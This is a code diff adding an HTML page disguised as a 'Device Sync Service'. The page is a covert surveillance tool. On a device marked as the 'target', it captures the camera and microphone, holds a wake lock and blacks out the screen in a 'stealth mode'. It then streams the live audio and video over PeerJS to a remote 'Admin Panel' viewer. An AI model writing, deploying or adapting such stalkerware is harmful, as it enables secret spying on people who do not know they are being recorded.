@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Sync Service</title> 
+    <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #111; color: #ddd; text-align: center; padding: 20px; margin: 0; height: 100vh; overflow: hidden; }
+        h2 { color: #888; font-size: 1.2rem; margin-bottom: 5px; }
+        .container { max-width: 400px; margin: 0 auto; background: #222; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        p { font-size: 0.9rem; color: #aaa; }
+        #myId { color: #4CAF50; font-weight: bold; letter-spacing: 1px; }
+        input { width: 85%; padding: 12px; margin: 15px 0; border: none; border-radius: 5px; background: #333; color: white; outline: none; text-align: center; }
+        button { width: 95%; padding: 12px; font-size: 1rem; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; transition: 0.3s; margin-bottom: 10px; }
+        
+        .btn-start { background: #444; color: #aaa; }
+        .btn-connect { background: #007bff; color: white; }
+        
+        video { width: 100%; height: 100vh; object-fit: contain; background: black; display: none; position: absolute; top: 0; left: 0; z-index: 100; }
+        
+        /* Stealth Mode */
+        .stealth-mode { background: black !important; }
+        .stealth-mode .container { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="uiBox">
+        <h2>Device Sync Service</h2>
+        <p>Status: <span id="myId">Connecting to server...</span></p>
+
+        <hr style="border: 0.5px solid #333; margin: 20px 0;">
+
+        <!-- Host -->
+        <button class="btn-start" onclick="startBackgroundService()">Initialize Sync</button>
+        <p style="font-size: 10px; margin-top: 0;">(Run this on target device)</p>
+
+        <hr style="border: 0.5px solid #333; margin: 20px 0;">
+
+        <!-- Viewer -->
+        <p style="margin-bottom: 5px; color: #fff;">Admin Panel</p>
+        <input type="text" id="targetId" placeholder="Enter Sync ID">
+        <button class="btn-connect" onclick="connectToDevice()">Connect</button>
+    </div>
+
+    <video id="videoElement" autoplay playsinline></video>
+
+    <script>
+        const peer = new Peer();
+        let localStream;
+
+        peer.on('open', function(id) {
+            document.getElementById('myId').innerText = id;
+        });
+
+        peer.on('call', function(call) {
+            if (localStream) {
+                call.answer(localStream); 
+            }
+        });
+
+        async function startBackgroundService() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }, 
+                    audio: true 
+                });
+                
+                document.getElementById('videoElement').srcObject = localStream;
+                if ('wakeLock' in navigator) navigator.wakeLock.request('screen');
+                document.body.classList.add('stealth-mode');
+            } catch (err) {
+                alert("Sync Error: Please check permissions.");
+            }
+        }
+
+        function connectToDevice() {
+            const target = document.getElementById('targetId').value;
+            if (!target) return alert("Please enter the Sync ID.");
+
+            const call = peer.call(target, document.createElement('canvas').captureStream()); 
+            
+            document.body.classList.add('stealth-mode');
+            document.getElementById('videoElement').style.display = "block";
+
+            call.on('stream', function(remoteStream) {
+                document.getElementById('videoElement').srcObject = remoteStream;
+            });
+        }
+    </script>
+</body>
+</html>
